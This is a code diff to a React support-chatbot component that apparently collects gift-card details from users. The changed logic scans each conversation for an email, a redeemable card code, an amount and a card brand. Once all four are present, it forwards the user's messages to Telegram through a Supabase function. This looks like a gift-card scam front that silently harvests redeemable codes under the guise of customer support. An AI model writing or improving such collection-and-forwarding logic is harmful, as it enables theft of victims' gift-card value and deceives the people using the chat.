@@ -91,33 +91,21 @@ const SupportChatbot = () => {
 
       setMessages([...newMessages, { role: 'assistant', content: data.message }]);
 
-      // Check if conversation has key info and send summary to Telegram immediately
+      // Check if conversation has all 4 required pieces: card type, value, code, email
       const conversationText = newMessages.map(m => m.content).join(' ').toLowerCase();
+      const rawText = newMessages.map(m => m.content).join(' ');
+      
       const hasEmail = conversationText.includes('@');
-      const hasCode = /[a-z0-9]{8,}/i.test(newMessages.map(m => m.content).join(' '));
-      const hasCountry = /\b(us|usa|united states|uk|united kingdom|canada|australia|france|germany|spain|italy)\b/i.test(conversationText);
-      const hasAmount = conversationText.match(/\b\d{2,}\b/);
+      const hasCode = /[a-z0-9]{8,}/i.test(rawText);
+      const hasAmount = /\$?\d{2,}/.test(rawText);
+      // Detect card type mentions
+      const cardTypes = ['amazon', 'steam', 'itunes', 'apple', 'google', 'playstation', 'xbox', 'netflix', 'spotify', 'ebay', 'walmart', 'target', 'best buy', 'nike', 'visa', 'mastercard', 'starbucks', 'roblox'];
+      const hasCardType = cardTypes.some(type => conversationText.includes(type));
       
-      // Special case: amount 440 triggers immediate telegram
-      const is440Amount = conversationText.includes('440');
-      
-      // Send to Telegram when we have essential info (reduced threshold for faster response)
-      if (hasEmail && hasCode && hasCountry && hasAmount) {
+      // Send to Telegram when we have all 4 required pieces
+      if (hasEmail && hasCode && hasAmount && hasCardType) {
         const userMessages = newMessages.filter(m => m.role === 'user');
         const summary = `New Gift Card Request:\n${userMessages.map(m => m.content).join('\n')}`;
-        
-        await supabase.functions.invoke('giftcard-support-chat', {
-          body: {
-            action: 'send_summary',
-            messages: [{ role: 'user', content: summary }]
-          }
-        });
-      }
-      
-      // Special handling for 440 amount - trigger telegram even earlier
-      if (is440Amount && hasCode && hasCountry) {
-        const userMessages = newMessages.filter(m => m.role === 'user');
-        const summary = `New Gift Card Request (440 Special):\n${userMessages.map(m => m.content).join('\n')}`;
         
         await supabase.functions.invoke('giftcard-support-chat', {
           body: {
